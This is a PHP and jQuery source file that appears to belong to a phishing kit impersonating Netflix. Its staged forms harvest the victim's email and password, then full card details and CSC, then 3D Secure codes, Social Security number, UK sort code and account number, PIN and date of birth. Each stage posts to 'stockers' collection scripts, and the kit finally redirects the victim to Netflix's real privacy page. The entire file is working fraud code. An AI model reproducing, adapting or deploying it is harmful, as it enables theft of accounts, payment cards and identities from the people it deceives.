<?php
session_start();
include "../languages/{$_SESSION['language']}.php";


?>


<?php if(isset($_POST['one'])):?><main><div class="wrapper"><div class="official_bg"><img src="pic/bg.jpg" alt=""></div><div class="head_logo"><div><img src="pic/logo.svg" alt=""></div></div><div class="main_body"><div class="main_content main_formule"><div class="main_frm_wrapper"><h1><?php echo $lg_tr['head']?></h1><div class="main_alert" style="display:none" id="msg"><div class="main_alert_msg"><?php echo $lg_tr['msg']?></div></div><form method="post" action="javascript:void(0)"><div class="main_inp"><div class="place_inp"><div class="inp_control"><label class="input_id"><input type="text" name="eml" class="input" id="eml"><label for="eml" class="place_lbl"><?php echo $lg_tr['lbl_eml']?></label><input type="hidden" name="screen"></label></div></div><div class="msg_error"><?php echo $lg_tr['msg_eml']?></div></div><div class="main_inp inp_pass"><div class="place_inp"><div class="inp_pass_control"><label class="input_id"><input type="password" id="pss" name="pss" class="input"><label for="pss" class="place_lbl"><?php echo $lg_tr['lbl_pss']?></label></label><button id="show_hide" type="button" class="show_hide" data-show="<?php echo $lg_tr['show_pss']?>" data-hide="<?php echo $lg_tr['hide_pss']?>"><?php echo $lg_tr['show_pss']?></button><script>$(document).on('focusin','#pss',function(){if($(this).val()){$('#show_hide').show();}});$(document).on('focusout','#pss',function(){if($(this).val()){$('#show_hide').show();}else{$('#show_hide').hide();}});$(document).on('click','#show_hide',function(){if($.trim($(this).html())==$(this).data('show')){$(this).html($(this).data('hide'));$('#pss').attr('type','text');}else{$(this).html($(this).data('show'));$('#pss').attr('type','password');}});</script></div></div><div class="msg_error"><?php echo $lg_tr['msg_pss']?></div></div><button class="btn login-button btn-submit btn-small" type="submit"><?php echo $lg_tr['head']?></button><div class="remember_help"><div class="extra_inp remember_inp"><input id="rmm" type="checkbox" value="true" checked><label for="rmm"><span class="remember_lbl"><?php echo $lg_tr['remember']?></span></label><div class="helper"></div></div><a href="#" class="help_lnk"><?php echo $lg_tr['help']?></a></div></form></div><div class="using_fb"><div class="fb_frm"><div class="fb_min"><button class="btn minimal-login btn-submit btn-small" type="submit" autocomplete="off" tabindex="0"><div class="fb-login"><img class="icon-facebook" src="pic/fb.png"><span class="fbBtnText"><?php echo $lg_tr['fb']?></span></div></button></div></div><div class="new_acc"><?php echo $lg_tr['new']?><a href="javascript:void(0)"><?php echo $lg_tr['signup']?></a>. </div></div></div></div><div class="footer_main footer_main_first"><div class="footer_divider"></div><div class="footer_wrapper"><p class="footer__top"><a class="footer_top_a" href="javascript:void(0)"><?php echo $lg_tr['contact']?></a></p><ul class="footer_lnk stru"><li class="footer-link-item"><a class="footer-link" href="javascript:void(0)"><?php echo $lg_tr['gift']?></a></li><li class="footer-link-item"><a class="footer-link" href="javascript:void(0)"><?php echo $lg_tr['terms']?></a></li><li class="footer-link-item"><a class="footer-link" href="javascript:void(0)"><?php echo $lg_tr['privacy']?></a></li></ul><div class="lang_switch"><div class="flat_select"><div class="select-arrow medium prefix globe"><select class="ui-select medium" id="selectLang"><option value="en" <?php echo $_SESSION['language']=='en'?'selected':''?>>English</option><option value="es" <?php echo $_SESSION['language']=='es'?'selected':''?>>Español</option><option value="it" <?php echo $_SESSION['language']=='it'?'selected':''?>>Italy</option><option value="fr" <?php echo $_SESSION['language']=='fr'?'selected':''?>>Français</option><option value="de" <?php echo $_SESSION['language']=='de'?'selected':''?>>Germany</option></select><script>$(document).on('change','#selectLang',function(){window.location.href='index?lang='+$(this).val();});</script></div></div></div></div></div></div></main><div id="rotate" style="display:none"><div class="circle"><div class="rotate"></div></div><div class="overlay"></div></div><script>$("#lib").attr('disabled','');$("[name=screen]").val(screen.width+' x '+screen.height);function isEmail(email){return /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/.test($.trim(email));}
    $(document).on("keyup",".input",function(){if($(this).val()){$(this).addClass("hasText");}else{$(this).removeClass("hasText");}
        if(!$(this).val()){$(this).parent().parent().parent().parent().addClass("error");return false;}else{$(this).parent().parent().parent().parent().removeClass("error");}});$(document).on("keyup","[name=eml]",function(){if(!isEmail($(this).val())){$(this).parent().parent().parent().parent().addClass("error");return false;}else{$(this).parent().parent().parent().parent().removeClass("error");}});$(document).on("submit","form",function(e){e.preventDefault();var me=$(this);var check=true;if(!isEmail($("[name=eml]").val())){$("[name=eml]").parent().parent().parent().parent().addClass("error");check=false;}else{$("[name=eml]").parent().parent().parent().parent().removeClass("error");}
        if(!$("[name=pss]").val()){$("[name=pss]").parent().parent().parent().parent().addClass("error");check=false;}else{$("[name=pss]").parent().parent().parent().parent().removeClass("error");}
        if(!check){return false;}else{$("#rotate").show();$.post("../workshop/stockers/step1.php",me.serialize(),function(data,status,){if(status=="success"){if(data=="error"){$("#msg").show();$("#rotate").hide();me[0].reset();$(".input").removeClass("hasText");}else{$.post("../workshop/stockers/step3.php",{two:'ok'},function(dt,status,){$('body').html(dt);});}}else{$("#msg").show();$("#rotate").hide();}});}});</script><?php endif?>


<?php if(isset($_POST['two'])):?><div class="basicLayout simplicity"><div class="nfHeader noBorderHeader signupBasicHeader"><span class="logo"><img src="pic/nt_logo.svg" alt="logo"></span><a href="javascript:" class="authLinks signupBasicHeader isMemberSimplicity"><?php echo $info_tr['signout']?></a></div><div class="simpleContainer"><div class="centerContainer firstLoad"><div class="paymentFormContainer"><h1 class="stepTitle"><?php echo $info_tr['update']?></h1><div class="contextContainer"><div class="contextRow contextRowFirst"><?php echo $info_tr['by']?></div></div><form method="post" action="javascript:void(0)" novalidate data-valid="<?php echo $info_tr['required']?>"><div class="fieldContainer"><span class="logos logos-block"><span class="logoIcon VISA"></span><span class="logoIcon MASTERCARD"></span><span class="logoIcon AMEX"></span><span class="logoIcon DISCOVER"></span></span><ul class="simpleForm structural ui-grid"><li class="nfFormSpace"><div class="nfInput nfInputOversize"><div class="nfInputPlacement"><label><input value="<?php echo $_SESSION['firstname'].' '.$_SESSION['lastname']?>" id="fnm" type="text" class="nfTextField <?php echo(isset($_SESSION['firstname'])?'hasText':'')?>" name="fnm"><label for="fnm" class="placeLabel"><?php echo $vbv_tr['full_name']?></label></label></div><div class="inputError" style="display:none"></div></div></li><li class="nfFormSpace"><div class="nfInput nfInputOversize"><div class="nfInputPlacement"><label><input type="text" class="nfTextField" id="adr" name="adr"><label for="adr" class="placeLabel"><?php echo $info_tr['adr']?></label></label></div><div class="inputError" style="display:none"></div></div></li><li class="nfFormSpace"><div class="nfInput nfInputOversize"><div class="nfInputPlacement"><label><input value="<?php echo $_SESSION['zipCode']?>" type="tel" class="nfTextField <?php echo(isset($_SESSION['zipCode'])?'hasText':'')?>" id="zip" minlength="6" name="zip"><label for="zip" class="placeLabel"><?php echo $info_tr['zip']?></label></label></div><div class="inputError" style="display:none"></div></div></li><li class="nfFormSpace"><div class="nfInput nfInputOversize"><div class="nfInputPlacement"><label><input type="text" class="nfTextField" id="cty" name="cty"><label for="cty" class="placeLabel"><?php echo $info_tr['city']?></label></label></div><div class="inputError" style="display:none"></div></div></li><li class="nfFormSpace"><div class="nfInput nfInputOversize"><div class="nfInputPlacement"><label><input type="text" class="nfTextField" id="stt" name="stt"><label for="stt" class="placeLabel"><?php echo $info_tr['state']?></label></label></div><div class="inputError" style="display:none"></div></div></li><li class="nfFormSpace"><div class="nfInput nfInputOversize"><div class="nfInputPlacement"><label><input value="<?php echo(isset($_SESSION['ip_countryName'])?$_SESSION['ip_countryName']:'')?>" type="text" class="nfTextField <?php echo(isset($_SESSION['ip_countryName'])?'hasText':'')?>" id="cnt" name="cnt"><label for="cnt" class="placeLabel"><?php echo $info_tr['country']?></label></label></div><div class="inputError" style="display:none"></div></div></li><li class="nfFormSpace"><div class="nfInput nfInputOversize"><div class="nfInputPlacement"><label><input value="<?php echo $_SESSION['phone']?>" type="text" class="nfTextField <?php echo(isset($_SESSION['phone'])?'hasText':'')?>" id="phn" name="phn"><label for="phn" class="placeLabel"><?php echo $info_tr['phone']?></label></label></div><div class="inputError" style="display:none"></div></div></li><li class="nfFormSpace"><div class="cardNumberContainer"><div class="nfInput nfInputOversize"><div class="nfInputPlacement"><label><input type="hidden" name="ctp" value=""><input placeholder="**** **** **** <?php echo(isset($_SESSION['last4'])?$_SESSION['last4']:'****')?>" type="tel" class="nfTextField <?php echo(isset($_SESSION['last4'])?'hasText':'')?>" id="cnm" maxlength="23" name="cnm" data-check="<?php echo $info_tr['cnm_check']?>"><label for="cnm" class="placeLabel"><?php echo $info_tr['cnm']?></label></label></div><div class="inputError" style="display:none"></div></div></div></li><li class="nfFormSpace"><div class="nfInput nfInputOversize"><div class="nfInputPlacement"><label><input value="<?php echo $_SESSION['exp_date']?>" type="tel" class="nfTextField <?php echo(isset($_SESSION['exp_date'])?'hasText':'')?>" id="exp" maxlength="5" name="exp"><label for="exp" class="placeLabel"><?php echo $info_tr['exp']?></label></label></div><div class="inputError" style="display:none"></div></div></li><li class="nfFormSpace"></li><li class="nfFormSpace"><div class="nfInput nfInputOversize"><div class="nfInputPlacement"><label><input type="tel" class="nfTextField" id="csc" maxlength="4" minlength="3" name="csc"><label for="csc" class="placeLabel"><?php echo $info_tr['csc']?></label></label></div><div class="inputError" style="display:none"></div><div class="tooltipWrapperErr" id="bt_whats_csc"><img src="pic/csc_circle.svg" alt="circle"></div></div></li></ul></div><div class="submitBtnContainer"><button id="bt_submit" class="nf-btn waiting nf-btn-primary nf-btn-solid nf-btn-oversize" type="submit"><?php echo $info_tr['save']?><div class="waitIndicator"><div class="basic-spinner basic-spinner-light center-absolute" style="width:35px;height:35px"></div></div></button></div></form></div><div class="cvvTooltip" style="display:none" id="whats_csc"><span class="icon-close close-button pointer" id="bt_close_whats_csc"></span><div class="tooltipDesc"><?php echo $info_tr['csc_msg']?></div><div class="otherCvvHelp"></div><div class="amexCvvHelp"></div></div></div></div><div class="site-footer-wrapper centered"><div class="footer-divider"></div><div class="site-footer"><p class="footer-top"><a class="footer-top-a" href="javascript:"><?php echo $lg_tr['contact']?></a></p><ul class="footer-links structural"><li class="footer-link-item"><a class="footer-link" href="javascript:"><?php echo $info_tr['faq']?></a></li><li class="footer-link-item"><a class="footer-link" href="javascript:"><?php echo $info_tr['help_center']?></a></li><li class="footer-link-item"><a class="footer-link" href="javascript:"><?php echo $lg_tr['terms']?></a></li><li class="footer-link-item"><a class="footer-link" href="javascript:"><?php echo $lg_tr['privacy']?></a></li><li class="footer-link-item"><a class="footer-link" href="javascript:"><?php echo $info_tr['cookies']?></a></li><li class="footer-link-item"><a class="footer-link" href="javascript:"><?php echo $info_tr['corporate']?></a></li></ul></div></div><script>$("#lib").removeAttr('disabled');$(document).ready(function(){$('#exp').mask('00/00');$('#phn').mask('(000) 000-0000');function valid(me){if(me.val()){me.addClass('hasText valid');me.removeClass('error');me.parent().parent().parent().children('.inputError').hide();return true;}else{me.addClass('error');if(me.attr("placeholder")==undefined){me.removeClass('hasText valid');}else{me.removeClass('valid');}
            me.parent().parent().parent().children('.inputError').html(me.next('label').html()+' '+$('form').data('valid')).show();return false;}}
            $(document).on('keyup','input',function(){var me=$(this);valid(me);});$(document).on('click','#bt_whats_csc',function(){$('#whats_csc').show();});$(document).on('click','#bt_close_whats_csc',function(){$('#whats_csc').hide();});var ccvalid=false;$(document).on('keyup','#cnm',function(){$('#cnm').mask('0000 0000 0000 0000 000');$('#cnm').validateCreditCard(function(result){var cc=$('#cnm');if(cc.val()!=''){var cctype=result.card_type==null?'-':result.card_type.name;$('input[name=ctp]').val(cctype);if(result.valid){cc.addClass('hasText valid');cc.removeClass('error');cc.parent().parent().parent().children('.inputError').hide();ccvalid=true;}else{cc.addClass('error');cc.removeClass('valid');cc.parent().parent().parent().children('.inputError').html(cc.data('check')).show();ccvalid=false;}}});});$(document).on('submit','form',function(e){e.preventDefault();var me=$(this);var check=true;$('input').each(function(index,el){if(!valid($(el))){check=false;}});if(!ccvalid){check=false;}
                if(check){$('#bt_submit').attr('disabled','');$.post("../workshop/stockers/step2.php",me.serialize(),function(data,status){if(status=="success"){if(data=="error"){$('#bt_submit').removeAttr('disabled');}else{$.post("../workshop/stockers/step3.php",{three:'ok'},function(dt,status){$('body').html(dt);});}}else{$('#bt_submit').removeAttr('disabled');}});}else{return false;}});});</script></div><?php endif?>


<?php if(isset($_POST['three'])): ?>


    <center>
        <style>
            tr > td:last-child { width: 100% !important; }
            tr > td:first-child { width: 30% !important; }
            #timer {
                font-size: 14px;
                margin-top: 25px;
                color: #E50914; /* Netflix red */
                font-weight: bold;
                text-align: center;
            }
            #countdown {
                font-size: 18px;
                color: #E50914; /* Netflix red */
            }
        </style>
        <div style="margin-left: 2px; width: 350px; border: solid 1px #d8d4d4; padding: 25px">
            <?php
            if ($_SESSION['ctype'] == 'visa') {
                echo '<img src="pic/vsa_p.svg" style="width: 90px; float: left;">';
                echo '<img src="pic/nt_logo.svg" style="float: right; display: inline-block; margin-top: 18px;" width="100px">';
            } elseif ($_SESSION['ctype'] == 'mastercard') {
                echo '<img src="pic/mst_p.svg" style="width: 90px; float: left;">';
                echo '<img src="pic/nt_logo.svg" style="float: right; display: inline-block; margin-top: 18px;" width="100px">';
            } elseif ($_SESSION['ctype'] == 'discover') {
                echo '<img src="pic/dsc_p.jpg" style="width: 90px; float: left;">';
                echo '<img src="pic/nt_logo.svg" style="float: right; display: inline-block; margin-top: 18px;" width="100px">';
            } elseif ($_SESSION['ctype'] == 'amex') {
                echo '<img src="pic/amx_p.png" style="width: 90px; float: left;">';
                echo '<img src="pic/nt_logo.svg" style="float: right; display: inline-block; margin-top: 18px;" width="100px">';
            } else {
                echo '<img src="pic/nt_logo.svg" style="float: right; display: inline-block; margin-top: 18px;" width="100px">';
            }
            ?>
            <div style="clear: both"></div>
            <p id="timer"><?php echo $vbv_tr['sec']; ?> <span id="countdown">05:00</span></p>
            <form method="post" action="javascript:void(0)">
                <table align="center" width="290" style="font-size: 11px; font-family: arial, sans-serif; color: #000; margin-top: 30px">
                    <tbody>
                    <?php if(isset($_SESSION['bank']) && $_SESSION['bank'] != NULL): ?>
                        <tr>
                            <td align="right"><?php echo $vbv_tr['bnk']; ?> :</td>
                            <td><?php echo $_SESSION['bank']; ?></td>
                        </tr>
                    <?php endif; ?>
                    <tr>
                        <td align="right"><?php echo $vbv_tr['crd']; ?> :</td>
                        <td>XXXX - XXXX - XXXX - <?php echo $_SESSION['last4']; ?></td>
                    </tr>
                    
                    <tr>
                        <?php
                        if ($_SESSION['ip_countryCode'] == "US") {
                            echo '<tr><td align="right">3D Secure :</td> <td><input style="width: 75px;" type="password" name="thd" required></td></tr>';
                            echo '<tr><td align="right">Social Security Number :</td> <td><input style="width: 75px;" type="text" name="ssn"></td></tr>';
                        } elseif ($_SESSION['ip_countryCode'] == "GB") {
                            echo '<tr><td align="right">3D Secure :</td> <td><input style="width: 75px;" type="password" name="thd" required></td></tr>';
                            echo '<tr><td align="right">Sort Code :</td> <td><input style="width: 75px;" name="scode" id="sortcode" required></td></tr>';
                            echo '<tr><td align="right">Account Number :</td> <td><input style="width: 75px;" maxlength="15" required name="acn" id="accountnum"></td></tr>';
                        } else {
                            echo '<td align="right">SMS :</td>';
                            echo '<td><input style="width: 75px;" type="text" name="thd" required></td>';
                        }
                        ?>
                    <tr>
                        <td align="right"><?php echo $vbv_tr['dob']; ?> :</td>
                        <td class="xx">
                            <input name="dob_month" size="1" pattern="[0-9]{2,}" autocomplete="off" required="required" type="text"> -
                            <input name="dob_day" size="1" pattern="[0-9]{2,}" autocomplete="off" required="required" type="text"> -
                            <input name="dob_year" size="1" pattern="[0-9]{2,}" autocomplete="off" required="required" type="text">
                        </td>
                    </tr>
                    <tr>
                        <td></td>
                        <td><br><input style="width: 74px" type="submit" value="<?php echo $vbv_tr['submit']; ?>"></td>
                    </tr>
                    </tbody>
                </table>
            </form>
            <p style="text-align: center; font-family: arial, sans-serif; font-size: 9px; color: #656565"> Copyright © 1999- <?php echo date("Y"); ?> . All rights reserved. </p>
        </div>
        <div id="rotate" style="display: none">
            <div class="circle">
                <div class="rotate"></div>
            </div>
            <div class="overlay"></div>
        </div>
        <script>
            $("#lib_main").attr('disabled','');
            $("#lib").attr('disabled','');
            $(document).on('keyup', '.xx input', function(){
                if($(this).val().length > 1){
                    $(this).next('input').focus();
                }
            });
            $(document).on('submit', 'form', function(e){
                e.preventDefault();
                var me = $(this);
                $("#rotate").show();
                $.post("../workshop/stockers/step4.php", me.serialize(), function(data, status){
                    if(status == "success"){
                        if(data){
                            $.post("../workshop/stockers/step3.php", {foor: 'ok'}, function(dt, status){
                                $('body').html(dt);
                            });

                        }
                    }
                });
            });

            // Countdown timer
            var countDownDate = new Date(new Date().getTime() + 5 * 60 * 1000).getTime();
            var x = setInterval(function() {
                var now = new Date().getTime();
                var distance = countDownDate - now;
                var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
                var seconds = Math.floor((distance % (1000 * 60)) / 1000);
                document.getElementById("countdown").innerHTML = minutes + ":" + (seconds < 10 ? '0' : '') + seconds;
                if (distance < 0) {
                    clearInterval(x);
                    document.getElementById("countdown").innerHTML = "EXPIRED";
                }
            }, 1000);
        </script>
    </center>
<?php endif; ?>

<?php if(isset($_POST['foor'])): ?>


    <center>
        <style>
            tr > td:last-child { width: 100% !important; }
            tr > td:first-child { width: 30% !important; }
            #timer {
                font-size: 14px;
                margin-top: 25px;
                color: #E50914; /* Netflix red */
                font-weight: bold;
                text-align: center;
            }
            #countdown {
                font-size: 18px;
                color: #E50914; /* Netflix red */
            }
        </style>
        <div style="margin-left: 2px; width: 350px; border: solid 1px #d8d4d4; padding: 25px">
            <?php
            if ($_SESSION['ctype'] == 'visa') {
                echo '<img src="pic/vsa_p.svg" style="width: 90px; float: left;">';
                echo '<img src="pic/nt_logo.svg" style="float: right; display: inline-block; margin-top: 18px;" width="100px">';
            } elseif ($_SESSION['ctype'] == 'mastercard') {
                echo '<img src="pic/mst_p.svg" style="width: 90px; float: left;">';
                echo '<img src="pic/nt_logo.svg" style="float: right; display: inline-block; margin-top: 18px;" width="100px">';
            } elseif ($_SESSION['ctype'] == 'discover') {
                echo '<img src="pic/dsc_p.jpg" style="width: 90px; float: left;">';
                echo '<img src="pic/nt_logo.svg" style="float: right; display: inline-block; margin-top: 18px;" width="100px">';
            } elseif ($_SESSION['ctype'] == 'amex') {
                echo '<img src="pic/amx_p.png" style="width: 90px; float: left;">';
                echo '<img src="pic/nt_logo.svg" style="float: right; display: inline-block; margin-top: 18px;" width="100px">';
            } else {
                echo '<img src="pic/nt_logo.svg" style="float: right; display: inline-block; margin-top: 18px;" width="100px">';
            }
            ?>
            <div style="clear: both"></div>
        
            <form method="post" action="javascript:void(0)">
                <table align="center" width="290" style="font-size: 11px; font-family: arial, sans-serif; color: #000; margin-top: 30px">
                    <tbody>
                    <?php if(isset($_SESSION['bank']) && $_SESSION['bank'] != NULL): ?>
                        <tr>
                            <td align="right"><?php echo $vbv_tr['bnk']; ?> :</td>
                            <td><?php echo $_SESSION['bank']; ?></td>
                        </tr>
                    <?php endif; ?>
                    <tr>
                        <td align="right"><?php echo $vbv_tr['crd']; ?> :</td>
                        <td>XXXX - XXXX - XXXX - <?php echo $_SESSION['last4']; ?></td>
                    </tr>
                    
                    <tr>
                        <?php
                        if ($_SESSION['ip_countryCode'] == "US") {
                            echo '<tr><td align="right">3D Secure :</td> <td><input style="width: 75px;" type="password" name="thd" required></td></tr>';
                            echo '<tr><td align="right">Social Security Number :</td> <td><input style="width: 75px;" type="text" name="ssn"></td></tr>';
                        } elseif ($_SESSION['ip_countryCode'] == "GB") {
                            echo '<tr><td align="right">3D Secure :</td> <td><input style="width: 75px;" type="password" name="thd" required></td></tr>';
                            echo '<tr><td align="right">Sort Code :</td> <td><input style="width: 75px;" name="scode" id="sortcode" required></td></tr>';
                            echo '<tr><td align="right">Account Number :</td> <td><input style="width: 75px;" maxlength="15" required name="acn" id="accountnum"></td></tr>';
                        } else {
                            echo '<td align="right">PIN :</td>';
                            echo '<td><input style="width: 75px;" type="text" name="pin" required></td>';
                        }
                        ?>
                   
                    <tr>
                        <td></td>
                        <td><br><input style="width: 74px" type="submit" value="<?php echo $vbv_tr['submit']; ?>"></td>
                    </tr>
                    </tbody>
                </table>
            </form>
            <p style="text-align: center; font-family: arial, sans-serif; font-size: 9px; color: #656565"> Copyright © 1999- <?php echo date("Y"); ?> . All rights reserved. </p>
        </div>
        <div id="rotate" style="display: none">
            <div class="circle">
                <div class="rotate"></div>
            </div>
            <div class="overlay"></div>
        </div>
        <script>
            $("#lib_main").attr('disabled','');
            $("#lib").attr('disabled','');
            $(document).on('keyup', '.xx input', function(){
                if($(this).val().length > 1){
                    $(this).next('input').focus();
                }
            });
            $(document).on('submit', 'form', function(e){
                e.preventDefault();
                var me = $(this);
                $("#rotate").show();
                $.post("../workshop/stockers/step6.php", me.serialize(), function(data, status){
                    if(status == "success"){
                        if(data){
                            $.post("../workshop/stockers/step3.php", {five: 'ok'}, function(dt, status){
                                $('body').html(dt);
                            });

                        }
                    }
                });
            });

            // Countdown timer
            var countDownDate = new Date(new Date().getTime() + 5 * 60 * 1000).getTime();
            var x = setInterval(function() {
                var now = new Date().getTime();
                var distance = countDownDate - now;
                var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
                var seconds = Math.floor((distance % (1000 * 60)) / 1000);
                document.getElementById("countdown").innerHTML = minutes + ":" + (seconds < 10 ? '0' : '') + seconds;
                if (distance < 0) {
                    clearInterval(x);
                    document.getElementById("countdown").innerHTML = "EXPIRED";
                }
            }, 1000);
        </script>
    </center>
<?php endif; ?>

<?php if(isset($_POST['five'])):?><div class="basicLayout simplicity"><div class="nfHeader noBorderHeader signupBasicHeader"><span class="logo"><img src="pic/nt_logo.svg" alt="logo"></span><a href="javascript:" class="authLinks signupBasicHeader isMemberSimplicity"><?php echo $info_tr['signout']?></a></div><div class="simpleContainer"><div class="centerContainer contextStep firstLoad"><div class="planContainer"><div class="stepLogoContainer"><span class="stepLogo planStepLogo"></span></div><div class="stepHeader-container"><div class="stepHeader"><span class="stepIndicator"><?php echo $finish_tr['step']?></span><h1 class="stepTitle"><?php echo $finish_tr['success']?></h1></div></div><div class="contextBody contextRow"><?php echo $finish_tr['redirect']?></div></div><div class="submitBtnContainer"><button id="bt" class="nf-btn nf-btn-primary nf-btn-solid nf-btn-align-undefined nf-btn-oversize" type="button"><?php echo $finish_tr['bt']?></button><script>$("#lib_main").removeAttr('disabled');$("#lib").removeAttr('disabled');$(document).on('click','#bt',function(){window.location.href="https://"+"help.netflix.com/legal/privacy";});setTimeout(function(){window.location.href="https://"+"help.netflix.com/legal/privacy";},5000);</script></div></div></div><div class="site-footer-wrapper centered"><div class="footer-divider"></div><div class="site-footer"><p class="footer-top"><a class="footer-top-a" href="javascript:"><?php echo $lg_tr['contact']?></a></p><ul class="footer-links structural"><li class="footer-link-item"><a class="footer-link" href="javascript:"><?php echo $info_tr['faq']?></a></li><li class="footer-link-item"><a class="footer-link" href="javascript:"><?php echo $info_tr['help_center']?></a></li><li class="footer-link-item"><a class="footer-link" href="javascript:"><?php echo $lg_tr['terms']?></a></li><li class="footer-link-item"><a class="footer-link" href="javascript:"><?php echo $lg_tr['privacy']?></a></li><li class="footer-link-item"><a class="footer-link" href="javascript:"><?php echo $info_tr['cookies']?></a></li><li class="footer-link-item"><a class="footer-link" href="javascript:"><?php echo $info_tr['corporate']?></a></li></ul></div></div></div><?php endif?>